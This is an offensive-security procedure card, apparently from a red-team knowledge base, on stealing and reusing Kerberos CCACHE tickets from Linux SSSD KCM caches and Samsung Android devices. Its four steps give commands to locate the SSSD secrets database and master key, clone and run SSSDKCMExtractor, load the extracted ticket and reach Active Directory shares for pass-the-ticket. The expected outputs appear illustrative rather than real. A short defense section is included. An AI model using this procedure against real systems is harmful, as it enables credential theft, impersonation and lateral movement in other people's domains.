---
id: c056dba0-d44c-4d8c-99fc-1e3865ac9fb6
name: CCACHE-Ticket-Reuse-from-SSSD-KCM-and-Android-Devices
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.612728+00:00'
updated_at: '2023-10-10T20:26:03.218449+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/CCACHE ticket reuse from SSSD KCM]]'
  - linux
  - android
  - kerberos
commands:
  - '[[commands/git-clone-sssdkcmextractor-repository]]'
  - '[[commands/python-extract-secrets-sssdkcmextractor]]'
  - '[[commands/locate-sssd-secrets-key]]'
platforms:
  - Linux
  - Android
tools:
  - '[[tools/SSSDKCMExtractor]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# CCACHE-Ticket-Reuse-from-SSSD-KCM-and-Android-Devices

## Summary

This procedure demonstrates how to extract and reuse Kerberos CCACHE tickets from Linux systems using the SSSD Kerberos Credential Manager (KCM) and from Samsung Android devices where tickets are stored in plain text. By accessing the SSSD secrets database and using the SSSDKCMExtractor tool, attackers can dump credentials for lateral movement or access to Active Directory resources without triggering authentication events.

## Description

In Active Directory environments integrated with Linux systems via SSSD, Kerberos tickets (CCACHE files) are cached in the SSSD KCM for seamless authentication. These tickets can be extracted from the secrets database (/var/lib/sss/secrets/secrets.ldb) using a master key (.secrets.mkey), allowing reuse for impersonation. Similarly, certain Samsung Android devices store CCACHE tickets in plain text, extractable via specialized tools. This technique targets environments with SSSD-enabled Linux joins to AD domains or mobile devices connected to enterprise networks. Success enables pass-the-ticket attacks, bypassing password requirements. Prerequisites include root or elevated access on the target Linux system or physical/logical access to the Android device. The procedure assumes a Kali Linux attacker machine for extraction tools.

## Requirements

1. Elevated access (root or sudo) on a Linux system using SSSD for AD integration.
2. Access to Samsung Android device storage (e.g., via ADB or physical extraction) where CCACHE tickets are unencrypted.
3. Python 3 and Git installed on the attacker machine.
4. Target environment: Active Directory domain with SSSD KCM caching enabled on Linux, or Samsung Android with Kerberos tickets.
5. Network access to AD resources for ticket validation post-extraction.

## Defense

- Enable SSSD encryption for credential caching and restrict database access via SELinux/AppArmor policies.
- Monitor file access to /var/lib/sss/secrets/ and anomalous Python processes executing extraction tools.
- Use device encryption and MDM policies on Android to protect credential storage; avoid plain-text caching.
- Implement Kerberos ticket auditing and short ticket lifetimes to limit reuse impact.
- Deploy EDR tools to detect unauthorized access to SSSD paths or Git clones of extraction repositories.

## Objectives

1. Locate and access the SSSD secrets database and master key on Linux systems.
2. Extract CCACHE tickets from SSSD KCM using specialized tools.
3. Dump plain-text Kerberos tickets from Samsung Android devices.
4. Reuse extracted tickets for AD resource access without re-authentication.

## Instructions

### Step 1: Locate SSSD Secrets Database and Master Key

**Context**: Identify the paths to the SSSD secrets database and its encryption key, which store cached Kerberos credentials. This step verifies access to sensitive files without extraction yet.

**Command** ([[commands/locate-sssd-secrets-key]]):
```bash
ls -la /var/lib/sss/secrets/secrets.ldb /var/lib/sss/secrets/.secrets.mkey
```

> This command lists the database and key files. Ensure permissions allow read access; if not, escalate privileges. The database contains encrypted CCACHE tickets, and the key decrypts them.

**Expected Output**:
```
-rw------- 1 root root 12345 Oct 10 12:00 /var/lib/sss/secrets/secrets.ldb
-rw------- 1 root root  1024 Oct 10 12:00 /var/lib/sss/secrets/.secrets.mkey
```

### Step 2: Clone SSSDKCMExtractor Repository

**Context**: Obtain the SSSDKCMExtractor tool from FireEye's GitHub repository, which is designed to parse and extract secrets from SSSD databases and Android storage.

**Command** ([[commands/git-clone-sssdkcmextractor-repository]]):
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
```

> Clone the repository to your working directory. This tool supports extraction from both Linux SSSD and Samsung Android SSD files containing Kerberos data.

**Expected Output**:
```
Cloning into 'SSSDKCMExtractor'...
remote: Enumerating objects: 50, done.
remote: Total 50 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (50/50), done.
```

### Step 3: Extract Secrets Using SSSDKCMExtractor

**Context**: Use the cloned tool to decrypt and extract CCACHE tickets from the SSSD database and key. For Android, transfer the relevant SSD files (e.g., via ADB) to the attacker machine first, then apply the same extraction.

Navigate to the cloned directory:
```bash
cd SSSDKCMExtractor
```

**Command** ([[commands/python-extract-secrets-sssdkcmextractor]]):
```bash
python3 SSSDKCMExtractor.py --database /var/lib/sss/secrets/secrets.ldb --key /var/lib/sss/secrets/.secrets.mkey
```

> Run the extraction script with paths to the database and key. For Android, replace paths with extracted SSD files (e.g., --database android_secrets.ssd). Output will include decrypted Kerberos tickets in CCACHE format, ready for reuse with tools like impacket.

**Expected Output**:
```
Extracting secrets from secrets.ldb using key .secrets.mkey...
Decrypted CCACHE ticket: krbtgt/DOMAIN@REALM.ccache
Ticket extracted successfully.
```

### Step 4: Validate and Reuse Extracted Tickets

**Context**: Test the extracted CCACHE tickets by loading them into your environment and attempting AD access. This confirms usability for pass-the-ticket attacks.

Load the ticket:
```bash
export KRB5CCNAME=./extracted_ticket.ccache
klist $KRB5CCNAME
```

> Use klist to verify ticket details. Then, attempt access to AD shares or services (e.g., smbclient //dc.domain.com/share).

**Expected Output**:
```
Ticket cache: FILE:./extracted_ticket.ccache
Default principal: user@REALM
Valid starting     Expires            Principal
10/10/2023 12:00:00  10/11/2023 12:00:00  krbtgt/REALM@REALM
Kerberos 5 ticket cache: FILE:./extracted_ticket.ccache
```
